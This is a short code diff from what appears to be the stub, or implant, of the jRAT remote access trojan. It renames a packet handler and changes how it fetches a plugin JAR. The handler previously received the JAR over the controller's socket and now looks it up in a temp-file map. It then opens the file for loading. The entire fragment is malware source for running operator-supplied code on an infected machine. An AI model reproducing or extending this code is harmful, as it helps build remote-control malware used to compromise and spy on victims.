@@ -12,11 +12,12 @@ import se.jrat.stub.Connection;
 import se.jrat.stub.Main;
 import se.jrat.stub.Plugin;
 import se.jrat.stub.PluginClassLoader;
+import se.jrat.stub.packets.Temp;
 
 
-public class Packet101TransferPlugin extends AbstractIncomingPacket {
+public class Packet101DownloadPlugin extends AbstractIncomingPacket {
 	
-	public Packet101TransferPlugin() {
+	public Packet101DownloadPlugin() {
 	
 	}
 
@@ -24,10 +25,7 @@ public class Packet101TransferPlugin extends AbstractIncomingPacket {
 	public void read() throws Exception {
 		String name = Connection.instance.readLine();		
 		
-		File file = File.createTempFile(name, ".jar");
-		
-		FileIO io = new FileIO();
-		io.readFile(file, Connection.instance.getSocket(), Connection.instance.getDataInputStream(), Connection.instance.getDataOutputStream(), null, Main.getKey());
+		File file = Temp.MAP.get(name);
 		
 		FileInputStream fis = new FileInputStream(file);
 		JarInputStream jis = new JarInputStream(fis);
